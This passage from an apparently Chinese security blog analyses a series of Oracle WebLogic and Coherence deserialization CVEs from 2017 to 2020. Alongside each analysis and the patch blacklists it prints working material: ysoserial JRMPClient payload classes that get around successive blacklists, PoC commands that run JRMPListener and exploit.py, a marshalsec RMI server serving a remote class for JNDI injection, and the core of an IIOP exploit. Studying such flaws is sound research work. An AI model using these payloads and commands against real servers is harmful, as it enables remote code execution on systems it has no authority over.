class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">proxy</span> <span class="operator">=</span> (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">            Registry.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<p>这里其实利用到了RMI和DGC的机制，当<strong>DGC Client</strong>调用远程对象时，会调用<strong>DGC Server</strong>的<code>dirty()</code>函数，这时<strong>DGC Server</strong>就向<strong>DGC Client</strong>返回一个<code>lease(DGCClient.vmid, DGCClient.leaseValue)</code>；当<strong>DGC Client</strong>不需要这个远程对象时，就会调用<strong>DGC Server</strong>的<code>clean()</code>函数，这个漏洞的关键点就在于我们可以伪造恶意的DGC Server向<strong>DGC Client</strong>，即victim，回送一个包含恶意payload的对象，让<strong>DGC Client</strong>在DGC层执行反序列化触发payload</p>
<p>漏洞链如下</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271436405b059050f3937f636e.png" alt="image-20210126142905037" style="zoom:67%;" />

<p><strong>补丁</strong></p>
<p>在<code>resolveProxyClass()</code>方法中加入对<code>java.rmi.registry.Registry</code>的检查</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveProxyClass(String[] interfaces) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    String[] arr$ = interfaces;</span><br><span class="line">    <span class="type">int</span> <span class="variable">len$</span> <span class="operator">=</span> interfaces.length;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i$</span> <span class="operator">=</span> <span class="number">0</span>; i$ &lt; len$; ++i$) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">intf</span> <span class="operator">=</span> arr$[i$];</span><br><span class="line">        <span class="keyword">if</span>(intf.equals(<span class="string">&quot;java.rmi.registry.Registry&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Unauthorized proxy deserialization&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.resolveProxyClass(interfaces);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h4><blockquote>
<p>Oracle WebLogic Server 10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3</p>
</blockquote>
<p><strong>poc</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections1 &#x27;touch /tmp/success&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python exploit.py 127.0.0.1 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 172.25.144.219 7777 JRMPClient2</span><br></pre></td></tr></table></figure>

<blockquote>
<p>还有一种通过CVE-2016-1000031 Apache Commons Fileupload进行任意文件写入</p>
<p>再者可以直接去掉CVE-2017-3248的Proxy的封装，从而直接绕过resolveProxyClass()方法</p>
</blockquote>
<p><strong>漏洞分析</strong></p>
<p>此漏洞是对CVE-2017-3248的绕过，因为<code>InboundMsgAbbrev</code>类的<code>resolveProxyClass()</code>仅仅只是对<code>java.rmi.registry.Registry</code>进行判断，所以我们可以通过其他RMI接口绕过，比如<code>java.rmi.activation.Activator</code></p>
<p>exploit的编写就是直接替换</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101272148c437c1ee4656e33bf769.png" alt="image-20210127214823732"></p>
<p><strong>补丁</strong></p>
<p>在<code>WeblogicFilterConfig.class</code>的黑名单中添加了<code>sun.rmi.server.UnicastRef</code>进行防御</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_BLACKLIST_CLASSES = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">     <span class="string">&quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;</span>, </span><br><span class="line">     <span class="string">&quot;org.codehaus.groovy.runtime.ConversionHandler&quot;</span>, </span><br><span class="line">     <span class="string">&quot;org.codehaus.groovy.runtime.MethodClosure&quot;</span>,</span><br><span class="line">     <span class="string">&quot;org.springframework.transaction.support.AbstractPlatformTransactionManager&quot;</span>, </span><br><span class="line">     <span class="string">&quot;sun.rmi.server.UnicastRef&quot;</span> <span class="comment">// new</span></span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure>



<h4 id="CVE-2018-2893"><a href="#CVE-2018-2893" class="headerlink" title="CVE-2018-2893"></a>CVE-2018-2893</h4><blockquote>
<p>Oracle WebLogic Server 10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3</p>
</blockquote>
<p><strong>payload</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPClient3</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span> &lt; Registry &gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">streamMessageImpl</span><span class="params">(<span class="type">byte</span>[] object)</span> &#123;</span><br><span class="line">        <span class="type">StreamMessageImpl</span> <span class="variable">streamMessage</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamMessageImpl</span>();</span><br><span class="line">        streamMessage.setDataBuffer(object, object.length);</span><br><span class="line">        <span class="keyword">return</span> streamMessage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String host;</span><br><span class="line">        <span class="type">int</span> port;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sep &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">objID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">tcpEndpoint</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">unicastRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(objID, tcpEndpoint, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">remoteObjectInvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(unicastRef);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">            Registry.class</span><br><span class="line">        &#125;, remoteObjectInvocationHandler);</span><br><span class="line">        <span class="keyword">return</span> streamMessageImpl(Serializer.serialize(object)); <span class="comment">// 用streamMessageImpl封装</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient3.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient3.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<p>此漏洞是对CVE-2018-2628的黑名单绕过，主要利用<code>weblogic.jms.common.StreamMessageImpl</code>在反序列化时不用经过<code>resolveProxyClass()</code>检查</p>
<p><strong>补丁</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_BLACKLIST_PACKAGES = &#123; </span><br><span class="line">    <span class="string">&quot;org.apache.commons.collections.functors&quot;</span>, </span><br><span class="line">    <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax&quot;</span>, </span><br><span class="line">    <span class="string">&quot;javassist&quot;</span>, </span><br><span class="line">    <span class="string">&quot;java.rmi.activation&quot;</span>, <span class="comment">// new</span></span><br><span class="line">    <span class="string">&quot;sun.rmi.server&quot;</span> <span class="comment">// new</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_BLACKLIST_CLASSES = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;</span><br><span class="line">    <span class="string">&quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;</span>, </span><br><span class="line">    <span class="string">&quot;org.codehaus.groovy.runtime.ConversionHandler&quot;</span>, </span><br><span class="line">    <span class="string">&quot;org.codehaus.groovy.runtime.MethodClosure&quot;</span>, </span><br><span class="line">    <span class="string">&quot;org.springframework.transaction.support.AbstractPlatformTransactionManager&quot;</span>, </span><br><span class="line">    <span class="string">&quot;java.rmi.server.UnicastRemoteObject&quot;</span>, <span class="comment">// new</span></span><br><span class="line">    <span class="string">&quot;java.rmi.server.RemoteObjectInvocationHandler&quot;</span> <span class="comment">// new</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="CVE-2018-3245"><a href="#CVE-2018-3245" class="headerlink" title="CVE-2018-3245"></a>CVE-2018-3245</h4><blockquote>
<p>Oracle WebLogic Server 10.3.6.0、12.1.3.0、12.2.1.3</p>
</blockquote>
<p><strong>poc</strong></p>
<p><em>payload1</em></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnectionImpl_Stub;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">    <span class="string">&quot;restriction&quot;</span></span><br><span class="line">&#125; )</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPClient3</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        String host;</span><br><span class="line">        <span class="type">int</span> port;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">RMIConnectionImpl_Stub</span> <span class="variable">stub</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnectionImpl_Stub</span>(ref); <span class="comment">// 使用RMIConnectionImpl_Stub封装</span></span><br><span class="line">        <span class="keyword">return</span> stub;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient3.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient3.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em>payload2</em></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper_Stub;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">    <span class="string">&quot;restriction&quot;</span></span><br><span class="line">&#125; )</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPClient4</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;ReferenceWrapper_Stub&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ReferenceWrapper_Stub  <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        String host;</span><br><span class="line">        <span class="type">int</span> port;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">ReferenceWrapper_Stub</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper_Stub</span>(ref); <span class="comment">// 使用ReferenceWrapper_Stub封装</span></span><br><span class="line">        <span class="keyword">return</span> stu;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient3.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient3.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<p>此漏洞是对cve-2018-2893的黑名单绕过，可以使用<code>ReferenceWrapper_Stub</code>或者<code>RMIConnectionImpl_Stub</code>代替<code>RemoteObjectInvocationHandler</code>，关键是在找<code>RemoteObject</code>类的子类</p>
<p><strong>补丁</strong></p>
<p>直接将基类<code>RemoteObject</code>加入到黑名单</p>
<h4 id="CVE-2019-2890"><a href="#CVE-2019-2890" class="headerlink" title="CVE-2019-2890"></a>CVE-2019-2890</h4><blockquote>
<p>WebLogic Server 10.3.6.0、12.1.3.0、12.2.1.3</p>
</blockquote>
<p><strong>工具利用</strong></p>
<p><a href="https://github.com/SukaraLin/CVE-2019-2890">https://github.com/SukaraLin/CVE-2019-2890</a></p>
<p>详细操作在README已经给出</p>
<p><strong>漏洞分析</strong></p>
<p>漏洞代码位于<code>weblogic.jar</code>中的<code>weblogic.wsee.jaxws.persistence.PersistentContext.class</code>类中，它的<code>readSubject()</code>方法中直接调用了<code>readObject()</code>方法进行反序列化，所以我们只要对着<code>writeObject()</code>写一个恶意对象就可以</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714373db23c5e588f464ce262.png" alt="image-20210126175015051"></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271437983682858b6836f4756d.png" alt="image-20210126175040943"></p>
<p><strong>补丁</strong></p>
<p>增加黑名单检测</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">WSFilteringObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">FilteringObjectInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String firstClassName;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WSFilteringObjectInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    	<span class="built_in">super</span>(in);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass descriptor) <span class="keyword">throws</span> ClassNotFoundException, IOException &#123; </span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="built_in">super</span>.resolveClass(descriptor);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>. firstClassName == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> descriptor.getName(); </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            	clazz.asSubclass(Subject.class);]</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">            	<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Internal System Error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>. firstClassName = className;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="CVE-2020-2551"><a href="#CVE-2020-2551" class="headerlink" title="CVE-2020-2551"></a>CVE-2020-2551</h4><blockquote>
<p>WebLogic Server 10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0</p>
</blockquote>
<p><strong>工具利用</strong></p>
<p><a href="https://github.com/Y4er/CVE-2020-2551.git">https://github.com/Y4er/CVE-2020-2551.git</a></p>
<p>这个payload只能用在直连网络下，所以Win下本地打docker是打不了的，你可以选择自己本地搭一个服务器，可以选择在Linux虚拟机起docker，当然还有更简单的就是自己在docker里装个jdk8，然后在docker里打（因为这个payload只能用jdk8运行）</p>
<p>创建依赖库的<code>wlfullclient.jar</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd WL_HOME/server/lib</span><br><span class="line">java -jar wljarbuilder.jar</span><br></pre></td></tr></table></figure>

<p>编译exp.java，这里必须保证jdk版本与目标环境一样</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">javac -source 1.6 -target 1.6 exp.java</span><br></pre></td></tr></table></figure>

<p>开启JNDI触发漏洞</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.RMIRefServer &quot;http://172.18.0.2/#exp&quot; 1099</span><br><span class="line">java -jar CVE-2020-2551.jar 172.18.0.2 7001 rmi://172.18.0.2:1099/exp</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<p>RMI-IIOP具体原理可参考这篇<a href="https://xz.aliyun.com/t/7422">文章</a></p>
<p>这个漏洞源于对<code>JtaTransactionManager</code>类的错误过滤导致的IIOP反序列化，我们把入口点定在<code>JtaTransactionManager</code>类的<code>readObject()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021357376eba9d4fcbd4f18d3e.png" alt="image-20210129213556384"></p>
<p>在<code>initUserTransactionAndTransactionManager()</code>方法中调用了<code>lookupUserTransaction()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021357e8f7f0c1ecfb087927ac.png" alt="image-20210129213630278"></p>
<p>在<code>lookupUserTransaction()</code>方法中使用<code>getJndiTemplate()</code>返回的<code>jndiTemplate</code>实例的<code>lookup()</code>方法进行JNDI</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202135808a71fb5f2e6ce2397eb.png" alt="image-20210129213658529"></p>
<p>所以只要控制我们的<code>userTransactionName</code>属性就可以JNDI任意类</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202135893e48783bc4de871b44d.png" alt="image-20210129213846393"></p>
<p>根据这篇<a href="https://xz.aliyun.com/t/7422">博客</a>可以知道，这个gadget在<a href="https://paper.seebug.org/718/">CVE-2018-3191</a>就已经被挖掘出来，当时修复的时候是<code>JtaTransactionManager</code>的父类<code>AbstractPlatformTransactionManager</code>加入到了黑名单列表，T3协议使用的是<code>resolveClass</code>方法进行过滤，<code>resolveClass</code>方法是会读取父类的，但是IIOP协议就不会去读取父类导致我们可以绕过黑名单，触发JNDI注入。</p>
<p>下面是exploit的核心部分</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建jndi的context</span></span><br><span class="line">Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;String, String&gt;();</span><br><span class="line">env.put(<span class="string">&quot;java.naming.factory.initial&quot;</span>, <span class="string">&quot;weblogic.jndi.WLInitialContextFactory&quot;</span>);</span><br><span class="line">env.put(<span class="string">&quot;java.naming.provider.url&quot;</span>, rhost);</span><br><span class="line"><span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line"><span class="comment">// payload</span></span><br><span class="line"><span class="type">JtaTransactionManager</span> <span class="variable">jtaTransactionManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JtaTransactionManager</span>();</span><br><span class="line">jtaTransactionManager.setUserTransactionName(rmiurl);</span><br><span class="line"><span class="comment">// 代理类封装并绑定</span></span><br><span class="line"><span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> createMemoitizedProxy(createMap(<span class="string">&quot;Foo&quot;</span>, jtaTransactionManager), Remote.class);</span><br><span class="line">context.rebind(<span class="string">&quot;Foo&quot;</span>), remote);</span><br></pre></td></tr></table></figure>

<p><strong>补丁</strong></p>
<p>据说是直接封禁IIOP协议？</p>
<h4 id="CVE-2020-2555"><a href="#CVE-2020-2555" class="headerlink" title="CVE-2020-2555"></a>CVE-2020-2555</h4><blockquote>
<p>Oracle Coherence 3.7.1.17、12.1.3.0、12.2.1.3、12.2.1.4</p>
<p>需要注意的虽然Weblogic 10.3.6.0自带Oracle Coherence 3.7，但是它默认未启用Coherence，所以不在影响范围之内</p>
</blockquote>
<p><strong>工具利用</strong></p>
<p><a href="https://github.com/Y4er/CVE-2020-2555.git">https://github.com/Y4er/CVE-2020-2555.git</a></p>
<p><strong>漏洞分析</strong></p>
<p>漏洞入口在<code>coherence.jar</code>的<code>LimitFilter</code>类的<code>toString()</code>方法中，而<code>BadAttributeValueExpException</code>这个类可以调用任何类（val）的<code>toString()</code>方法，只要控制<code>setSecurityManager</code>为<code>null</code>即可，所以我们利用它来封装我们的恶意对象</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271437bc0b762a1921e1de3106.png" alt="image-20210127123724776"></p>
<p>在<code>toString()</code>方法中，提取<code>m_comparator</code>的值作为ValueExtractor，再对<code>m_oAnchorTop</code>和<code>m_oAnchorBottom</code>调用<code>extract()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714373cd6a3047dec16ffcc82.png" alt="image-20210127131228572"></p>
<p>进入<code>extract()</code>，它是创建一个的aExtractor，并递归调用<code>extract()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714378d6a778ed7c269d93054.png" alt="image-20210127131851693"></p>
<p><code>getExtractors()</code>返回的是<code>m_aExtractor</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714371dcf8ddf74226cda2ecc.png" alt="image-20210127131908064"></p>
<p>内部的<code>extract()</code>就是利用反射机制返回方法调用，方法名和参数都可以空，所以只要构成一条extract chain就可以实现任意代码执行了</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271437e11ca574d1a166db1591.png" alt="image-20210127132406861"></p>
<p>exploit核心部分</p>
